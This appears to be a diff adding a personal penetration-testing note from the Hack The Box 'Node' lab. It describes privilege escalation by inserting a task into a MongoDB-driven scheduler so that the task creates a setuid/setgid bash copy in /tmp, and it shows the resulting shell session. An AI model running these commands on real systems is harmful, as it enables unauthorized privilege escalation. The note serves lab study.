@@ -1,0 +1,33 @@
+#database privesc mongodb scheduler
+
+#scheduler privesc:
+Conditions: You are on the box as user A, the application, /var/scheduler/app.js is running as user B. User B has permissions to user.txt.
+/var/scheduler/app.js has a mongodb connection string in it, and appears to run commands scheduled by the database.
+
+Scheduler running as user B, with access to the DB resources as user A (user A credentials) - this presents an opportunity. 
+
+Use this to log into the mongo DB:
+mongo -p -u USER DB_NAME
+[enter password]
+
+Then, you can schedule a task like this (unsure if this will work for every collection/DB):
+db.tasks.insert( { "cmd": "/bin/cp /bin/bash /tmp/Bsh; chmod 6775 /tmp/Bsh" } );
+
+This insert depends on the DB and the code as far as what field/name to give each value and collection name. 
+
+Then, the suid/guid bash binary needs to be executed with the '-p' option to be able to set the euid and egid values. 
+
+NOTE: If both suid and guid values are set (6775), you will end up having euid and egid of the owning user/group. 
+If only suid bit is set (4775), you will only have the euid of the owning user. If only the guid is set (2775),
+you will end up with only the egid of the owning group. 
+
+From HTB Node:
+mark@node:/tmp$ whoami
+mark
+mark@node:/tmp$ ./tombash2 -p
+tombash2-4.3$ whoami
+tom
+tombash2-4.3$ id
+uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1000(tom) groups=1000(tom),1001(mark)
+tombash2-4.3$
+
